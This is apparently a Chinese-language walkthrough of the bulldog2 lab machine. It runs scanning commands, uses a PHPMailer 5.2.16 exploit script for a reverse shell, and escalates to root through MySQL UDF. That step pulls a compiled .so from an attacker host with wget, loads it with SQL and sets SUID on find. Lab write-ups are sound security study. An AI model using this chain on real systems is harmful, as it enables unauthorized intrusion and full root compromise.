靶机（bulldog2）：192.168.20.138

🍭0x01 信息收集

主机发现

netdiscover -i eth0 -r 192.168.20.0/24

端口扫描

masscan --rate=10000 -p0-65535 192.168.20.138

开放了111、22、50311、80端口

网站指纹信息

目录扫描

🍭0x02 信息利用

浏览目录扫描到的网站，发现第一个flag

该目录下还有一个文件记录了服务还有对应的历史漏洞

还发现了一个版本文件

可推断网站使用PHPMailer服务且版本为5.2.16

🍭0x03 漏洞利用

看到服务先用kali工具搜索看有没有可利用脚本

根据版本选择40974.py，查看说明

searchsploit -x php/webapps/40974.py

下载到当前目录下

修改脚本内容

执行脚本

在kali上开启监听，对靶机的shell.php进行访问即可反弹shell

和之前一样获取交互式终端

找一下有没有flag

find / -name "flag*"

🍭0x04 提权

先查看正在运行的进程有没有以root权限运行的服务

ps -aux | grep root

注意到mysql服务，联想到udf提权，去搜索一下有没有可利用脚本

这里需要知道MySQL版本，去找看看有没有数据库密码，查找文件发现了wordpress目录下有网站配置文件，进行搜索passwd关键字：

在第28行有关键词：

进行数据库登录：

udf提权先决条件：

  • 先获取mysql的权限（连接上了mysql数据库）

  • Mysql版本大于5.1，且知道plugin目录

  • mysql有写入文件的权限，即secure_file_priv的值为空

条件都满足，可利用udf提权。根据数据库版本5.5.6选择1518.c，打开里面有说明

按照说明执行，先将 1518.c 进行编译，生成共享库 1518.so

gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

在kali上开启服务，在靶机上下载1518.so

python -m SimpleHTTPServer 8000  # 在kali中开启服务
wget http://192.168.20.131:8000/1518.so  	#下载文件

登录mysql进行操作

* mysql> use mysql;
* mysql> create table foo(line blob);    #创建数据表 foo,字段blob,linestring类型
* mysql> insert into foo values(load_file('/var/www/html/1518.so'));
* mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';   #因为mysql版本>=5.1，所以必须把 UDF 的动态链接库.so文件放置于 MySQL 安装目录下的 lib/mysql/plugin 文件夹下文件夹下才能创建自定义函数。
* mysql> create function do_system returns integer soname '1518.so';  #//新建存储do_system函数,引用1518.so文件
* mysql> select * from mysql.func;
* mysql> select do_system('chmod u+s /usr/bin/find');   #调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令

执行find命令提权，拿到flag

find / -exec '/bin/sh' \;

4个flag都被找到啦。
